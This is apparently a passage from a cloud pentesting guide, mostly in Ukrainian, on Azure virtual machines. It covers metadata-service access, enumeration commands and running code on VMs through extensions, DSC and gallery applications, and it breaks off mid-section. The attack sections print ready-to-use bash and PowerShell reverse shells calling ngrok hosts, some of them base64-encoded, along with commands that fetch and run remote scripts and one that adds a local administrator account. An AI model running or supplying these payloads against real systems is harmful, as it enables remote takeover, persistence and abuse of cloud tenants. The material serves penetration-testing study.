–°–ª—É–∂–±–∞ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ Azure (IMDS) **–Ω–∞–¥–∞—î —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∑–∞–ø—É—â–µ–Ω—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏—Ö –º–∞—à–∏–Ω** –¥–ª—è –¥–æ–ø–æ–º–æ–≥–∏ –≤ —ó—Ö —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—ñ —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ. –í–æ–Ω–∞ –ø—Ä–æ–ø–æ–Ω—É—î –¥–µ—Ç–∞–ª—ñ, —Ç–∞–∫—ñ —è–∫ SKU, –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è, –º–µ—Ä–µ–∂–µ–≤—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –º–∞–π–±—É—Ç–Ω—ñ –ø–æ–¥—ñ—ó —Ç–µ—Ö–Ω—ñ—á–Ω–æ–≥–æ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è —á–µ—Ä–µ–∑ **REST API, –¥–æ—Å—Ç—É–ø–Ω–∏–π –∑–∞ –Ω–µ—Ä–æ–∑–ø–æ–¥—ñ–ª–µ–Ω–æ—é IP-–∞–¥—Ä–µ—Å–æ—é 169.254.169.254**, —è–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ –ª–∏—à–µ –∑—Å–µ—Ä–µ–¥–∏–Ω–∏ –í–ú. –ó–≤'—è–∑–æ–∫ –º—ñ–∂ –í–ú —Ç–∞ IMDS –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –≤ –º–µ–∂–∞—Ö —Ö–æ—Å—Ç–∞, —â–æ –∑–∞–±–µ–∑–ø–µ—á—É—î –±–µ–∑–ø–µ—á–Ω–∏–π –¥–æ—Å—Ç—É–ø. –ü—Ä–∏ –∑–∞–ø–∏—Ç—ñ –¥–æ IMDS HTTP-–∫–ª—ñ—î–Ω—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –í–ú –ø–æ–≤–∏–Ω–Ω—ñ –æ–±—Ö–æ–¥–∏—Ç–∏ –≤–µ–±-–ø—Ä–æ–∫—Å—ñ –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –Ω–∞–ª–µ–∂–Ω–æ—ó –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –¥–ª—è –∑–≤'—è–∑–∫—É –∑ –∫—ñ–Ω—Ü–µ–≤–æ—é —Ç–æ—á–∫–æ—é –º–µ—Ç–∞–¥–∞–Ω–∏—Ö HTTP-–∑–∞–ø–∏—Ç –ø–æ–≤–∏–Ω–µ–Ω –º–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ **`Metadata: true`** —ñ –Ω–µ –ø–æ–≤–∏–Ω–µ–Ω –º–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ **`X-Forwarded-For`**.

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ –π–æ–≥–æ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –≤:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-vm" %}

## VM Enumeration

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# VMs
## List all VMs and get info about one
az vm list --output table
az vm show --name <came> --resource-group <rsc-group>

## List all available VM images and get info about one
az vm image list --all --output table

# VM Extensions
## List all VM extensions
az vm extension image list --output table

## Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table

## List extensions in a VM
az vm extension list -g <rsc-group> --vm-name <vm-name>

## List managed identities in a VM
az vm identity show \
--resource-group <rsc-group> \
--name <vm-name>

# Disks
## List all disks and get info about one
az disk list --output table
az disk show --name <disk-name> --resource-group <rsc-group>

# Snapshots
## List all galleries abd get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all snapshots and get info about one
az snapshot list --output table
az snapshot show --name <name> --resource-group <rsc-group>

# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shared with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>

# Bastion
## list all bastions
az network bastion list -o table

# Network
## List VNets
az network vnet list --query "[].{name:name, location:location, addressSpace:addressSpace}"

## List subnets of a VNet
az network vnet subnet list --resource-group <ResourceGroupName> --vnet-name <VNetName> --query "[].{name:name, addressPrefix:addressPrefix}" -o table

## List public IPs
az network public-ip list --output table

## Get NSG rules
az network nsg rule list --nsg-name <NSGName> --resource-group <ResourceGroupName> --query "[].{name:name, priority:priority, direction:direction, access:access, protocol:protocol, sourceAddressPrefix:sourceAddressPrefix, destinationAddressPrefix:destinationAddressPrefix, sourcePortRange:sourcePortRange, destinationPortRange:destinationPortRange}" -o table

## Get NICs and subnets using this NSG
az network nsg show --name MyLowCostVM-nsg --resource-group Resource_Group_1 --query "{subnets: subnets, networkInterfaces: networkInterfaces}"

## List all Nics & get info of a single one
az network nic list --output table
az network nic show --name <name> --resource-group <rsc-group>

## List Azure Firewalls
az network firewall list --query "[].{name:name, location:location, subnet:subnet, publicIp:publicIp}" -o table

## Get network rules of a firewall
az network firewall network-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get application rules of a firewall
az network firewall application-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get nat rules of a firewall
az network firewall nat-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## List Route Tables
az network route-table list --query "[].{name:name, resourceGroup:resourceGroup, location:location}" -o table

## List routes for a table
az network route-table route list --route-table-name <RouteTableName> --resource-group <ResourceGroupName> --query "[].{name:name, addressPrefix:addressPrefix, nextHopType:nextHopType, nextHopIpAddress:nextHopIpAddress}" -o table

# Misc
## List all virtual machine scale sets
az vmss list --output table

## List all availability sets
az vm availability-set list --output table

## List all load balancers
az network lb list --output table

## List all storage accounts
az storage account list --output table

## List all custom script extensions on a specific VM
az vm extension list --vm-name <vm-name> --resource-group <resource-group>

# Show boot diagnostics settings for a specific VM
az vm boot-diagnostics get-boot-log --name <vm-name> --resource-group <resource-group>

## List all tags on virtual machines
az resource list --resource-type "Microsoft.Compute/virtualMachines" --query "[].{Name:name, Tags:tags}" --output table

# List all available run commands for virtual machines
az vm run-command list --output table
```
{% endcode %}
{% endtab %}

{% tab title="Az PS" %}
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
{% endtab %}
{% endtabs %}

## –í–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —É –í–ú

### –†–æ–∑—à–∏—Ä–µ–Ω–Ω—è –í–ú

–†–æ–∑—à–∏—Ä–µ–Ω–Ω—è Azure –í–ú - —Ü–µ –Ω–µ–≤–µ–ª–∏–∫—ñ –ø—Ä–æ–≥—Ä–∞–º–∏, —è–∫—ñ –∑–∞–±–µ–∑–ø–µ—á—É—é—Ç—å **–∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –ø—ñ—Å–ª—è —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è** —Ç–∞ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—é –∑–∞–≤–¥–∞–Ω—å –Ω–∞ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏—Ö –º–∞—à–∏–Ω–∞—Ö Azure (–í–ú).

–¶–µ –¥–æ–∑–≤–æ–ª–∏—Ç—å **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –í–ú**.

–ù–µ–æ–±—Ö—ñ–¥–Ω–∏–π –¥–æ–∑–≤—ñ–ª - **`Microsoft.Compute/virtualMachines/extensions/write`**.

–ú–æ–∂–Ω–∞ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –≤—Å—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
# It takes some mins to run
az vm extension image list --output table

# Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table
```
–ú–æ–∂–ª–∏–≤–æ **–∑–∞–ø—É—Å–∫–∞—Ç–∏ –≤–ª–∞—Å–Ω—ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å –≤–ª–∞—Å–Ω–∏–π –∫–æ–¥**:

{% tabs %}
{% tab title="Linux" %}
* –í–∏–∫–æ–Ω–∞—Ç–∏ –∑–≤–æ—Ä–æ—Ç–Ω–∏–π —à–µ–ª–ª

{% code overflow="wrap" %}
```bash
# Prepare the rev shell
echo -n 'bash -i  >& /dev/tcp/2.tcp.eu.ngrok.io/13215 0>&1' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ==

# Execute rev shell
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{}' \
--protected-settings '{"commandToExecute": "nohup echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ== | base64 -d | bash &"}'
```
{% endcode %}

* –í–∏–∫–æ–Ω–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –≤ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/8ce279967be0855cc13aa2601402fed3/raw/72816c3603243cf2839a7c4283e43ef4b6048263/hacktricks_touch.sh"]}' \
--protected-settings '{"commandToExecute": "sh hacktricks_touch.sh"}'
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
* –í–∏–∫–æ–Ω–∞—Ç–∏ —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª

{% code overflow="wrap" %}
```bash
# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Execute it
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{}' \
--protected-settings '{"commandToExecute": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="}'

```
{% endcode %}

* –í–∏–∫–æ–Ω–∞—Ç–∏ —Ä–µ–≤–µ—Ä—Å-—à–µ–ª –∑ —Ñ–∞–π–ª—É

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/33b6d1a80421694e85d96b2a63fd1924/raw/d0ef31f62aaafaabfa6235291e3e931e20b0fc6f/ps1_rev_shell.ps1"]}' \
--protected-settings '{"commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File ps1_rev_shell.ps1"}'
```
{% endcode %}

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ —ñ–Ω—à—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫: `powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add`

* –°–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è VMAccess

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}
{% endtab %}
{% endtabs %}

### –í—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –í–ú

–ù–µ–æ–±—Ö—ñ–¥–Ω–∏–π –¥–æ–∑–≤—ñ–ª –≤—Å–µ —â–µ **`Microsoft.Compute/virtualMachines/extensions/write`**.

<details>

<summary>–†–æ–∑—à–∏—Ä–µ–Ω–Ω—è VMAccess</summary>

–¶–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—å (–∞–±–æ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏, —è–∫—â–æ –π–æ–≥–æ –Ω–µ —ñ—Å–Ω—É—î) –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ Windows –í–ú.

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}

</details>

<details>

<summary>DesiredConfigurationState (DSC)</summary>

–¶–µ **—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –í–ú**, —è–∫–µ –Ω–∞–ª–µ–∂–∏—Ç—å Microsoft —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PowerShell DSC –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—î—é Azure Windows –íMs. –¢–æ–º—É –π–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥** —É Windows VMs —á–µ—Ä–µ–∑ —Ü–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è:
```powershell
# Content of revShell.ps1
Configuration RevShellConfig {
Node localhost {
Script ReverseShell {
GetScript = { @{} }
SetScript = {
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',attacker-port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte, 0, $sendbyte.Length)
}
$client.Close()
}
TestScript = { return $false }
}
}
}
RevShellConfig -OutputPath .\Output

# Upload config to blob
$resourceGroup = 'dscVmDemo'
$storageName = 'demostorage'
Publish-AzVMDscConfiguration `
-ConfigurationPath .\revShell.ps1 `
-ResourceGroupName $resourceGroup `
-StorageAccountName $storageName `
-Force

# Apply DSC to VM and execute rev shell
$vmName = 'myVM'
Set-AzVMDscExtension `
-Version '2.76' `
-ResourceGroupName $resourceGroup `
-VMName $vmName `
-ArchiveStorageAccountName $storageName `
-ArchiveBlobName 'revShell.ps1.zip' `
-AutoUpdate `
-ConfigurationName 'RevShellConfig'
```
</details>

<details>

<summary>–ì—ñ–±—Ä–∏–¥–Ω–∏–π —Ä–æ–±–æ—á–∏–π –ø—Ä–æ—Ü–µ—Å</summary>

–¶–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –í–ú, —è–∫–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —Ä–æ–±–æ—á—ñ –ø—Ä–æ—Ü–µ—Å–∏ —É –í–ú –∑ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Å–ª—É–∂–±—É [–û–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó](../az-automation-account/).

</details>

### –ó–∞—Å—Ç–æ—Å—É–Ω–∫–∏ –í–ú

–¶–µ –ø–∞–∫–µ—Ç–∏ –∑ —É—Å—ñ–º–∞ **–¥–∞–Ω–∏–º–∏ –ø—Ä–æ–≥—Ä–∞–º–∏ —Ç–∞ —Å–∫—Ä–∏–ø—Ç–∞–º–∏ –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–¥–∞–ª–µ–Ω–Ω—è**, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –ª–µ–≥–∫–æ–≥–æ –¥–æ–¥–∞–≤–∞–Ω–Ω—è —Ç–∞ –≤–∏–¥–∞–ª–µ–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º —É –í–ú.

{% code overflow="wrap" %}
```bash
# List all galleries in resource group
az sig list --resource-group <res-group> --output table

# List all apps in a fallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table
```
{% endcode %}

–¶–µ —à–ª—è—Ö–∏, –¥–µ –ø—Ä–æ–≥—Ä–∞–º–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è –≤ —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É:

* Linux: `/var/lib/waagent/Microsoft.CPlat.Core.VMApplicationManagerLinux/<appname>/<app version>`
* Windows: `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.9\Downloads\<appname>\<app version>`

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –Ω–æ–≤—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –≤ [https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli](https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli)

{% hint style="danger" %}
–ú–æ–∂–ª–∏–≤–æ **–¥—ñ–ª–∏—Ç–∏—Å—è –æ–∫—Ä–µ–º–∏–º–∏ –¥–æ–¥–∞—Ç–∫–∞–º–∏ —Ç–∞ –≥–∞–ª–µ—Ä–µ—è–º–∏ –∑ —ñ–Ω—à–∏–º–∏ –ø—ñ–¥–ø–∏—Å–∫–∞–º–∏ –∞–±–æ –æ—Ä–µ–Ω–¥–∞—Ä—è–º–∏**. –©–æ –¥—É–∂–µ —Ü—ñ–∫–∞–≤–æ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É —Å—Ç–≤–æ—Ä–∏—Ç–∏ –±–µ–∫–¥–æ—Ä –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º–∏ —Ç–∞ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ —ñ–Ω—à–∏—Ö –ø—ñ–¥–ø–∏—Å–æ–∫ —ñ –æ—Ä–µ–Ω–¥–∞—Ä—ñ–≤.
{% endhint %}

–ê–ª–µ **–Ω–µ–º–∞—î "—Ä–∏–Ω–∫—É" –¥–ª—è vm –¥–æ–¥–∞—Ç–∫—ñ–≤**, —è–∫ —Ü–µ —î –¥–ª—è —Ä–æ–∑—à–∏—Ä–µ–Ω—å.

–ù–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏:

* `Microsoft.Compute/galleries/applications/write`
* `Microsoft.Compute/galleries/applications/versions/write`
* `Microsoft.Compute/virtualMachines/write`
* `Microsoft.Network/networkInterfaces/join/action`
* `Microsoft.Compute/disks/write`

–ü—Ä–∏–∫–ª–∞–¥ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥:

{% tabs %}
{% tab title="Linux" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group myResourceGroup \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellApp \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Linux \
--location "West US 2"

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
az sig gallery-application version create \
--version-name 1.0.2 \
--application-name myReverseShellApp \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--remove-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--update-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name <vm-name> \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/1.0.2 \
--treat-deployment-as-failure true
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group <rsc-group> \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Windows \
--location "West US 2"

# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
